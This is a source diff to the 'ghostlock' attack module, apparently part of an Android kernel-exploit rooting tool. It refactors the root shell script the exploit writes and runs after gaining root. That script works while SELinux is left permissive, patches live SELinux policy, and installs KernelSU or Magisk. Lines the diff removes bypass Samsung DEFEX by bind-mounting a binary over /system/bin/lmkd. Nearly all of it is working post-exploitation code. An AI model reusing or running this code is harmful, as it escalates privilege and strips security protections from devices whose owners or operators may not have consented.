@@ -7,6 +7,7 @@
  */
 
 #include "attack/ops.hpp"
+#include "handoff_script.h"
 #include "support/fatal_error.hpp"
 
 #include "session/exploit_session.hpp"
@@ -15,6 +16,7 @@
 #include <array>
 #include <string>
 #include <string_view>
+#include <vector>
 #include <linux/perf_event.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
@@ -271,28 +273,73 @@ namespace ghostlock::attack {
         }
     }
 
+    /* Quotes one value for the sidecar's shell-readable form. Paths are
+     * app-generated; this still handles a quote rather than trusting it. */
+    std::string shell_quote(const std::string &value) {
+        std::string out = "'";
+        for (const char c: value) {
+            if (c == '\'')
+                out += "'\\''";
+            else
+                out += c;
+        }
+        out += "'";
+        return out;
+    }
+
+    /* The handoff core's parameters travel beside the script, never in the
+     * process environment: the DirtyFrag init shell does not inherit ours and
+     * the timer's fake-cred child has a fixed envp[]. `$0`-derived by the core.
+     * Values here are the app's transport list already staged for this uid. */
+    void write_handoff_sidecar(void) {
+        const auto &cfg = config::runtime_config_snapshot();
+        std::string text;
+        text += "HOME_DIR=" + shell_quote(cfg.home_dir) + "\n";
+        text += "LOG=" + shell_quote(cfg.ksu_log_path) + "\n";
+        text += std::string("SAFE_MODE=") +
+                (session::g_exploit_session.profile.safe_mode() ? "1" : "0") + "\n";
+        text += "VRKO_SELINUX_BLOCK=" +
+                shell_quote(config::vr_ko_mode_name(cfg.vrko_selinux_block)) + "\n";
+        text += "MODULE_PATH=" + shell_quote(cfg.module_path) + "\n";
+        text += "MODULE_KO=" + shell_quote(cfg.module_ko) + "\n";
+        std::string targets;
+        for (size_t i = 0; i < cfg.handoff_targets.size(); ++i) {
+            if (i > 0) targets += '\n';
+            targets += cfg.handoff_targets[i];
+        }
+        text += "TARGETS=" + shell_quote(targets) + "\n";
+        const std::string path = cfg.root_script_path + ".conf";
+        support::UniqueFd fd(open(path.c_str(), O_WRONLY | O_CREAT | O_TRUNC, 0644));
+        if (!fd.valid()) {
+            pr_warning("open handoff sidecar failed path=%s errno=%d\n", path.c_str(), errno);
+            return;
+        }
+        if (write(fd.get(), text.data(), text.size()) != static_cast<ssize_t>(text.size())) {
+            pr_warning("write handoff sidecar failed errno=%d\n", errno);
+        }
+    }
+
     void write_root_script(void) {
-        /* The SELinux enforce-write block adds ~2.5 KiB and the Magisk handoff
-         * another ~2.5 KiB; 32 KiB keeps the script well clear of the
+        /* The SELinux enforce-write block adds ~2.5 KiB, the shared handoff
+         * core another ~6 KiB; 32 KiB keeps the script well clear of the
          * truncation guard below. */
+        const auto &cfg = config::runtime_config_snapshot();
         std::string script(32768, '\0');
-        support::UniqueFd sfd(
-            open((config::runtime_config_snapshot().root_script_path.c_str()), O_WRONLY | O_CREAT | O_TRUNC, 0755));
+        support::UniqueFd sfd(open((cfg.root_script_path.c_str()), O_WRONLY | O_CREAT | O_TRUNC, 0755));
         if (!sfd.valid()) {
             pr_warning("open root script failed path=%s errno=%d\n",
-                       (config::runtime_config_snapshot().root_script_path.c_str()), errno);
+                       (cfg.root_script_path.c_str()), errno);
             return;
         }
 
+        /* The script is: shebang, the embedded handoff core, then this route's
+         * prologue (which may override the core's two hooks). The core is
+         * written as bytes, not through a printf format. */
+        std::string head = "#!/system/bin/sh\n";
+        head.append(kHandoffScript, sizeof(kHandoffScript) - 1);
+
         int32_t n = snprintf(
             script.data(), script.size(),
-            "#!/system/bin/sh\n"
-            "HOME_DIR='%s'\n"
-            "LOG='%s'\n"
-            /* The app's files dir has failed to take this log before (one
-             * transient EACCES on 2026-11-09). Fall back to a root-writable
-             * path and announce it on stdout (the native captures stdout as
-             * script-output), so the run still has a log somewhere. */
             "if ! ( : >>\"$LOG\" ) 2>/dev/null; then\n"
             "  LOG=\"${TMPDIR:-/data/local/tmp}/ghostlock-ksu-$$.log\"\n"
             "  echo \"LOG-FALLBACK=$LOG\"\n"
@@ -304,45 +351,9 @@ namespace ghostlock::attack {
             "MODE_TEXT=$(cat \"$MODE_FILE\" 2>/dev/null)\n"
             "NO_INSTR=0\n"
             "case \"$MODE_TEXT\" in *noinstrument*) NO_INSTR=1 ;; esac\n"
-            "SAFE_MODE=%d\n"
-            "VRKO_SELINUX_BLOCK='%s'\n"
-            /* The root manager the exploit installs. kernelsu late-loads ksud;
-             * magisk runs the userspace late install (module pipeline or a
-             * bench switch on a W1 pipeline). Both run while permissive: the
-             * live policy patch needs `security:security load_policy`, which
-             * no shipped domain holds. */
-            "HANDOFF='%s'\n"
-            "MAGISK_BIN='%s'\n"
-            "MODULE_PATH='%s'\n"
-            /* The staged switch module's file, read (never loaded) to learn the
-             * name the kernel registered. Empty on the W1 pipelines. */
-            "MODULE_KO='%s'\n"
-            "KSUD=\"$HOME_DIR/ksud\"\n"
             "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
             "chmod 644 \"$LOG\" 2>/dev/null\n"
             "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
-            "if [ ! -x \"$KSUD\" ]; then\n"
-            "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu.pr*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
-            "fi\n"
-            "if [ ! -x \"$KSUD\" ]; then\n"
-            "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
-            "fi\n"
-            "if [ ! -x \"$KSUD\" ]; then\n"
-            "  KSUD=$(find /data/app -path '*/com.rifsxd.ksunext*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
-            "fi\n"
-            "if [ ! -x \"$KSUD\" ]; then\n"
-            "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
-            "fi\n"
-            "if [ ! -x \"$KSUD\" ]; then\n"
-            "  KSUD=$(find /data/app -path '*/org.bakasu.bakasu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
-            "fi\n"
-            "if [ ! -x \"$KSUD\" ]; then\n"
-            "  KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
-            "fi\n"
-            "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
-            "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
-            "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
-            "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
             "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
             /* The switch module's kernel name, read from the staged file's
              * .modinfo (`name=...`, a NUL-separated table). The file is the
@@ -370,24 +381,13 @@ namespace ghostlock::attack {
             "  timeout 2 rmmod \"$ko_name\" 2>/dev/null\n"
             "  echo \"[*] switch unload: name=$ko_name rc=$?\" >>\"$LOG\"\n"
             "}\n"
-            "restore_enforce() {\n"
-            "  e_reason=\"$1\"\n"
-            "  e_before=$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
-            "  echo \"[*] enforcing restore: reason=$e_reason before=${e_before:-unreadable}\" >>\"$LOG\"\n"
-            "  if echo 1 > /sys/fs/selinux/enforce 2>/dev/null; then e_wrote=1; else e_wrote=0; fi\n"
-            "  e_after=$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
-            /* The DirtyFrag shell runs as toolbox, which may set but not read
-             * the enforce node: the successful write is the fact the stage can
-             * use. It goes to stdout, which survives the enforcing restore
-             * where a $LOG write does not. */
-            "  echo \"ENFORCE-RESTORE reason=$e_reason before=${e_before:-unreadable} wrote=$e_wrote readback=${e_after:-unreadable}\"\n"
-            "}\n"
             /* Ends the run: leave no switch module behind, then restore
-             * enforcing. W1 leaves SELinux permissive, so every post-W1 exit
-             * goes through here -- a run that cannot finish the root phase must
-             * not leave the device permissive (or its module loaded) until
-             * reboot. Dumps are written before this call: the dump path is
-             * blocked once enforcing is back. */
+             * enforcing (the shared core owns `restore_enforce`). W1 leaves
+             * SELinux permissive, so every post-W1 exit goes through here -- a
+             * run that cannot finish the root phase must not leave the device
+             * permissive (or its module loaded) until reboot. Dumps are written
+             * before this call: the dump path is blocked once enforcing is
+             * back. */
             "finish_run() {\n"
             "  unload_switch_module\n"
             "  restore_enforce \"$1\"\n"
@@ -411,66 +411,6 @@ namespace ghostlock::attack {
             "    st_caps=\"$st_caps ${f##*/}=$(cat \"$f\" 2>/dev/null)\"\n"
             "  done\n"
             "  echo \"enforce=${st_enforce:-unreadable} checkreqprot=${st_cr:-n/a} caps:${st_caps:- unreadable}\"\n"
-            "}\n"
-            /* The Magisk handoff: reproduce magiskinit by hand. The permissive
-             * window is opened by W1 (dirtyfrag/ghostlock pipelines) or by the
-             * bundle's module (module pipeline), so the live policy patch is
-             * allowed; everything that needs the pre-patch permissions runs
-             * here, and the caller restores enforcing afterwards. */
-            "magisk_handoff() {\n"
-            "  mg_m=\"${MAGISKTMP:-/debug_ramdisk}\"\n"
-            "  echo \"[*] magisk: bin=$MAGISK_BIN tmp=$mg_m script_module=${MODULE_PATH:-none}\" >>\"$LOG\"\n"
-            "  mkdir -p \"$mg_m\" /data/adb/magisk /data/adb/modules /data/adb/post-fs-data.d /data/adb/service.d 2>>\"$LOG\"\n"
-            "  if ! grep -q \" $mg_m \" /proc/mounts 2>/dev/null; then\n"
-            "    mount -t tmpfs -o mode=0755 tmpfs \"$mg_m\" 2>>\"$LOG\" || \\\n"
-            "      echo '[!] magisk: tmpfs mount failed; using the directory' >>\"$LOG\"\n"
-            "  fi\n"
-            "  for f in magisk magisk32 magiskboot magiskinit magiskpolicy busybox bootctl init-ld; do\n"
-            "    [ -f \"$MAGISK_BIN/$f\" ] || continue\n"
-            "    cp -f \"$MAGISK_BIN/$f\" \"$mg_m/$f\" 2>>\"$LOG\"\n"
-            "    cp -f \"$MAGISK_BIN/$f\" /data/adb/magisk/$f 2>>\"$LOG\"\n"
-            "    chmod 755 \"$mg_m/$f\" /data/adb/magisk/$f 2>/dev/null\n"
-            "  done\n"
-            "  ln -sf \"$mg_m/magisk\" \"$mg_m/su\"\n"
-            "  ln -sf \"$mg_m/magisk\" \"$mg_m/resetprop\"\n"
-            "  ln -sf \"$mg_m/magiskpolicy\" \"$mg_m/supolicy\"\n"
-            "  mkdir -p \"$mg_m/.magisk/device\" \"$mg_m/.magisk/worker\" 2>>\"$LOG\"\n"
-            "  touch \"$mg_m/.magisk/config\" 2>/dev/null\n"
-            "  mg_pol=''\n"
-            "  for p in /vendor/etc/selinux/precompiled_sepolicy /system/etc/selinux/precompiled_sepolicy; do\n"
-            "    [ -f \"$p\" ] && { mg_pol=\"$p\"; break; }\n"
-            "  done\n"
-            "  if [ -x \"$mg_m/magiskpolicy\" ]; then\n"
-            "    if [ -n \"$mg_pol\" ]; then\n"
-            "      \"$mg_m/magiskpolicy\" --load \"$mg_pol\" --live --magisk >>\"$LOG\" 2>&1\n"
-            "      MG_POLICY_RC=$?\n"
-            "    else\n"
-            /* No monolithic precompiled policy on this ROM: patch the live
-             * policy (already the fixup's repacked one). */
-            "      \"$mg_m/magiskpolicy\" --live --magisk >>\"$LOG\" 2>&1\n"
-            "      MG_POLICY_RC=$?\n"
-            "    fi\n"
-            "    echo \"MAGISK-PHASE policy rc=$MG_POLICY_RC source=${mg_pol:-live}\" >>\"$LOG\"\n"
-            "  else\n"
-            "    MG_POLICY_RC=1\n"
-            "    echo '[!] magisk: magiskpolicy missing' >>\"$LOG\"\n"
-            "  fi\n"
-            "  if [ -x \"$mg_m/magisk\" ]; then\n"
-            "    \"$mg_m/magisk\" --post-fs-data >>\"$LOG\" 2>&1\n"
-            "    echo \"MAGISK-PHASE post-fs-data rc=$?\" >>\"$LOG\"\n"
-            "  fi\n"
-            "  mg_pid=''\n"
-            "  for i in $(seq 1 30); do\n"
-            "    mg_pid=$(pidof magiskd 2>/dev/null)\n"
-            "    [ -n \"$mg_pid\" ] && break\n"
-            "    sleep 0.1\n"
-            "  done\n"
-            "  echo \"[*] magiskd=${mg_pid:-none}\" >>\"$LOG\"\n"
-            "  if [ -z \"$mg_pid\" ]; then return 3; fi\n"
-            "  [ -x \"$mg_m/magisk\" ] && \"$mg_m/magisk\" --service >>\"$LOG\" 2>&1\n"
-            "  [ -x \"$mg_m/magisk\" ] && \"$mg_m/magisk\" --boot-complete >>\"$LOG\" 2>&1\n"
-            "  echo \"MAGISK-SUMMARY magiskd=$mg_pid enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) policy=${mg_pol:-live} policy_rc=${MG_POLICY_RC:-na} su=$(ls -l \\\"$mg_m/su\\\" 2>/dev/null)\"\n"
-            "  return 0\n"
             "}\n"
             "if [ \"$(id -u)\" -ne 0 ]; then\n"
             "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
@@ -544,7 +484,10 @@ namespace ghostlock::attack {
             "  echo \"[*] vr.ko selinux block: bind rc=$rc node=$(stat -c '%%F' /proc/vrp 2>/dev/null) mi=$(grep -c ' /proc/vrp ' /proc/self/mountinfo 2>/dev/null)\" >>\"$LOG\"\n"
             "  stopped=\"\"\n"
             "  for e in $pre; do\n"
-            "    p=${e%%%%|*}; ns=$(echo \"$e\" | cut -d'|' -f3); fd=$(echo \"$e\" | cut -d'|' -f4)\n"
+            /* `cut`, not ${v%%|*}: the device's sh treats a bare `|` in the
+             * pattern as an empty alternative (the same trap the handoff
+             * core documents). */
+            "    p=$(echo \"$e\" | cut -d'|' -f1); ns=$(echo \"$e\" | cut -d'|' -f3); fd=$(echo \"$e\" | cut -d'|' -f4)\n"
             "    if [ \"$rc\" -ne 0 ] || [ \"$ns\" != \"$myns\" ] || [ \"$fd\" -gt 0 ] || [ ! -c /proc/vrp ]; then\n"
             "      kill -STOP \"$p\" 2>/dev/null && stopped=\"$stopped $p\"\n"
             "    fi\n"
@@ -740,163 +683,27 @@ namespace ghostlock::attack {
              * debug folder on every run. A failed fixup keeps the file, which
              * is why it is worth having next to that run's other dumps. */
             "if [ \"$FIXUP_RC\" -eq 0 ]; then rm -f \"$POLICY\"; fi\n"
-            /* No KMI is derived here: the Magisk handoff never reads one, and
-             * the KernelSU branch derives it at the point of use. A qgki build
-             * ("5.4.274-qgki-g...") and a GKI build with a vendor localversion
-             * ("5.10.246-gki-g...") both carry no androidNN token, so making
-             * this shared would refuse a handoff that needs none. */
-            "# safe mode: disable all modules before exec ksud\n"
-            "if [ \"$SAFE_MODE\" = \"1\" ]; then\n"
-            "  echo \"[*] safe mode: disabling all modules under /data/adb/modules\" >>\"$LOG\"\n"
-            "  n=0\n"
-            "  for m in /data/adb/modules/*/; do\n"
-            "    [ -d \"$m\" ] || continue\n"
-            "    if touch \"${m}disable\" 2>/dev/null; then\n"
-            "      n=$((n+1))\n"
-            "      echo \"  disabled ${m}\" >>\"$LOG\"\n"
-            "    fi\n"
-            "  done\n"
-            "  echo \"[*] safe mode: $n module(s) disabled\" >>\"$LOG\"\n"
-            "fi\n"
-
-            "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
-            "if [ \"$HANDOFF\" = magisk ]; then\n"
-            /* The permissive window is open (W1 did it, or the module did). */
-            "  magisk_handoff\n"
-            "  MAGISK_READY=$?\n"
+            /* The handoff core owns the attempts, the readiness contract and
+             * the single restore. The wrapper supplies only what is its own:
+             * the debug dump before the first attempt and the switch-module
+             * unload before enforcing returns. */
+            "handoff_pre_attempt() {\n"
             "  dump_debug\n"
             "  DUMP_DONE=1\n"
-            "  finish_run magisk-handoff\n"
-            "  if [ \"$MAGISK_READY\" -ne 0 ]; then\n"
-            "    finish_run magisk-not-ready\n"
-            "    exit 1\n"
+            "}\n"
+            "handoff_before_restore() {\n"
+            "  unload_switch_module\n"
+            "}\n"
+            "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+            /* The core dumps through the hook while still permissive, before
+             * any manager's init can re-enforce and close the dump path. */
+            "  handoff_run\n"
+            "  HANDOFF_RC=$?\n"
+            "  if [ \"$NO_INSTR\" -eq 0 ]; then\n"
+            "    echo \"HANDOFF-DIAG rc=$HANDOFF_RC enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) kernelsu=$(grep -c '^kernelsu' /proc/modules 2>/dev/null) magiskd=$(pidof magiskd 2>/dev/null) log=$LOG\"\n"
+            "    timeout 2 dmesg 2>/dev/null | command grep -i -E 'defex|kdp|rkp|kernelsu|magisk' | tail -n 15\n"
             "  fi\n"
-            "else\n"
-            "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
-            "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
-            "  KSU_ALREADY=1\n"
-            "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
-            "else\n"
-            "  KSU_ALREADY=0\n"
-            /* KernelSU's late-load selects its module by KMI name
-             * (`<kmi>_kernelsu.ko` inside ksud's assets), so the string must be
-             * the exact GKI branch. Derive it strictly here, where it is used:
-             * the leading version must be two numeric dot fields and the token
-             * must be `android<digits>`. The old shared form
-             * `grep -o 'android[0-9]*'` matched a bare "android" and emitted
-             * the malformed "android-5.10", and it refused before the handoff
-             * branch even when the handoff was Magisk, which never reads a KMI
-             * (the 5.4 qgki module pipeline, 2026-11-26). No fallback to
-             * ksud's auto-detection: `--kmi` is optional in KernelSU-Next, but
-             * the app hands over to any of several KSU-family managers and
-             * only the `late-load --help` interface is known to be common. */
-            "  KMI_WHY=''\n"
-            "  UNAME_R=$(uname -r)\n"
-            /* cut, not ${var%%...}: this text is itself a printf format, so a
-             * literal `%%` would collapse to `%` before the shell ever saw
-             * it. Nothing below may contain a lone `%`. */
-            "  kmi_v=$(echo \"$UNAME_R\" | cut -d- -f1)\n"
-            "  kmi_maj=$(echo \"$kmi_v\" | cut -d. -f1)\n"
-            "  kmi_min=$(echo \"$kmi_v\" | cut -d. -f2)\n"
-            "  KVER=''\n"
-            "  if [ -n \"$kmi_maj\" ] && [ -n \"$kmi_min\" ]; then\n"
-            "    case \"${kmi_maj}${kmi_min}\" in\n"
-            "      *[!0-9]*) ;;\n"
-            "      *) KVER=\"${kmi_maj}.${kmi_min}\" ;;\n"
-            "    esac\n"
-            "  fi\n"
-            "  AVER=$(echo \"$UNAME_R\" | grep -o 'android[0-9][0-9]*' | head -1)\n"
-            "  if [ -z \"$KVER\" ]; then\n"
-            "    KMI_WHY='uname -r has no numeric <major>.<minor>'\n"
-            "  elif [ -z \"$AVER\" ]; then\n"
-            "    KMI_WHY='uname -r carries no android<NN> token'\n"
-            "  fi\n"
-            "  if [ -n \"$KMI_WHY\" ]; then\n"
-            "    echo \"[!] cannot parse KMI from uname -r ($KMI_WHY); late-load cannot pick a module\" >>\"$LOG\"\n"
-            "    finish_run kmi-parse\n"
-            "    exit 1\n"
-            "  fi\n"
-            "  KMI=\"${AVER}-${KVER}\"\n"
-            "  if [ ! -x \"$KSUD\" ]; then\n"
-            "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
-            "    dump_debug\n"
-            "    DUMP_DONE=1\n"
-            "    finish_run ksud-missing\n"
-            "    exit 1\n"
-            "  fi\n"
-            "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
-            "  dump_debug\n"
-            "  echo \"KSU-PHASE late-load-direct kmi=$KMI\"\n"
-            "  chmod 755 \"$KSUD\" 2>/dev/null\n"
-            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
-            "  KSU_LOAD_RC=$?\n"
-            "  echo \"[*] late-load exit=$KSU_LOAD_RC\" >>\"$LOG\"\n"
-            /* Samsung DEFEX safeplace kills a root exec of a /data binary
-             * (ksud) before it can load the module. Retry the same exec with
-             * the binary bind-mounted over a whitelisted system path: DEFEX
-             * sees /system/bin/lmkd, ksud runs, and the module is loaded from
-             * ksud's embedded asset. The mount is detached immediately after
-             * the call; lmkd never re-execs, so the window is inert. */
-            "  KSU_NOW=0\n"
-            "  for i in $(seq 1 20); do\n"
-            "    if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_NOW=1; break; fi\n"
-            "    sleep 0.1\n"
-            "  done\n"
-            "  if [ \"$KSU_NOW\" -ne 1 ]; then\n"
-            "    echo '[*] late-load did not load; retrying via the /system/bin/lmkd bind mount' >>\"$LOG\"\n"
-            "    echo 'KSU-PHASE late-load-mount'\n"
-            "    umount -l /system/bin/lmkd 2>/dev/null\n"
-            "    if [ -e /system/bin/lmkd ] && mount --bind \"$KSUD\" /system/bin/lmkd 2>>\"$LOG\"; then\n"
-            "      /system/bin/lmkd late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
-            "      echo \"[*] mounted late-load exit=$?\" >>\"$LOG\"\n"
-            "      umount -l /system/bin/lmkd 2>/dev/null\n"
-            "    else\n"
-            "      echo '[!] /system/bin/lmkd bind mount unavailable' >>\"$LOG\"\n"
-            "    fi\n"
-            "  fi\n"
-            "fi\n"
-            "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
-            "KSU_READY=0\n"
-            "for i in $(seq 1 50); do\n"
-            "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
-            "  sleep 0.1\n"
-            "done\n"
-            "if [ \"$KSU_READY\" -eq 1 ]; then\n"
-            "  echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
-            "else\n"
-            "  echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
-            "fi\n"
-            /* Dump while still permissive: after the enforcing restore the
-             * toolbox domain cannot write the app's data dir, which is why the
-             * previous build's dump silently vanished. The late-load path also
-             * dumps before the load; a module-init re-enforce can make this
-             * second dump fail, but the earlier files remain. */
-            "dump_debug\n"
-            "DUMP_DONE=1\n"
-            "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
-            "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
-            "  finish_run already-loaded\n"
-            "elif [ \"$KSU_READY\" -eq 1 ]; then\n"
-            /* The module re-enforces at the end of its init; this write is a
-             * no-op then, and the corrective one if it did not. */
-            "  finish_run late-loaded\n"
-            "fi\n"
-            /* Unredirected so the native's script-output carries the verdict
-             * even when the app's log path was not writable. The dmesg tail
-             * names the DEFEX/KDP side of a failed load before the box can
-             * reset (the polled drain keeps the last full snapshot). This
-             * block is diagnostic only: it runs after the marker, the dump and
-             * the enforcing restore, and every dmesg read is bounded, so a
-             * stuck dmesg can never hold the cleanup. */
-            "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
-            "  echo \"KSU-SUMMARY enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) kernelsu=$(grep -c '^kernelsu' /proc/modules 2>/dev/null) lmkd_mount=$(grep -c ' /system/bin/lmkd ' /proc/self/mountinfo 2>/dev/null) log=$LOG\"\n"
-            "  timeout 2 dmesg 2>/dev/null | command grep -i -E 'defex|kdp|rkp|kernelsu' | tail -n 15\n"
-            "fi\n"
-            "if [ \"$KSU_READY\" -ne 1 ]; then\n"
-            "  finish_run ksu-not-loaded\n"
-            "  exit 1\n"
-            "fi\n"
-            "fi\n"
+            "  if [ \"$HANDOFF_RC\" -ne 0 ]; then exit 1; fi\n"
             "else\n"
             "  echo '[!] fixup failed; restoring enforcing' >>\"$LOG\"\n"
             "  dump_debug\n"
@@ -904,26 +711,22 @@ namespace ghostlock::attack {
             "  finish_run fixup-failed\n"
             "  exit 1\n"
             "fi\n",
-            (config::runtime_config_snapshot().home_dir.c_str()),
-            (config::runtime_config_snapshot().ksu_log_path.c_str()),
-            session::g_exploit_session.profile.safe_mode() ? 1 : 0,
-            config::vr_ko_mode_name(config::runtime_config_snapshot().vrko_selinux_block),
-            config::runtime_config_snapshot().handoff.c_str(),
-            config::runtime_config_snapshot().magisk_bin.c_str(),
-            config::runtime_config_snapshot().module_path.c_str(),
-            config::runtime_config_snapshot().module_ko.c_str(),
             (config::runtime_config_snapshot().debug_dir.c_str()));
         if (n < 0 || n >= static_cast<int32_t>(script.size())) {
             pr_warning("root script too long\n");
             return;
         }
-        if (write(sfd.get(), script.data(), static_cast<size_t>(n)) != n) {
+        /* Shebang + the embedded core, then this route's prologue. */
+        std::string out = head;
+        out.append(script.data(), static_cast<size_t>(n));
+        if (write(sfd.get(), out.data(), out.size()) != static_cast<ssize_t>(out.size())) {
             pr_warning("write root script failed errno=%d\n", errno);
         }
         sfd.reset();
         chmod((config::runtime_config_snapshot().root_script_path.c_str()), 0755);
-        pr_info("root script written path=%s bytes=%d\n", (config::runtime_config_snapshot().root_script_path.c_str()),
-                n);
+        write_handoff_sidecar();
+        pr_info("root script written path=%s bytes=%zu\n",
+                (config::runtime_config_snapshot().root_script_path.c_str()), out.size());
     }
 
     /* Find a task through perf sample records. */
